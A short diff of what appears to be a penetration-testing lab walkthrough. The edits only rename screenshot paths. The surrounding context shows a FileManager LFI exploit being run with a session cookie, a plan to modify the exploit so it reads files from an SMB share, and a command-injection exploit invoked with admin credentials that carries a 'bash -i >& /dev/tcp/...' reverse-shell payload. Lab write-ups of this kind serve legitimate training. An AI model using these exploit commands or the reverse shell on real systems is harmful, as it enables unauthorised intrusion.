@@ -120,7 +120,7 @@ $ python3 49359.py http://192.168.183.145 PHPSESSID=86a4n0gbbc9klrmvq461tnfk8n /
 
 There was something blocking us from reading PHP files here, and its probably the `.htaccess` file. Within the FileManager instance, I noticed that the same PDFs on SMB were present within it.
 
-<figure><img src="../../../.gitbook/assets/image (65).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (65) (5).png" alt=""><figcaption></figcaption></figure>
 
 The LFI exploit copies and pastes files into directories, and this means that we should be able to read the file from the SMB share. We just need to modify the `paste_clipboard` function within the exploit:
 
@@ -197,7 +197,7 @@ $ python2 45161.py -u admin -p thedoctor -c 'bash -i >& /dev/tcp/192.168.45.184/
 ```
 {% endcode %}
 
-<figure><img src="../../../.gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (35) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## Privilege Escalation
 
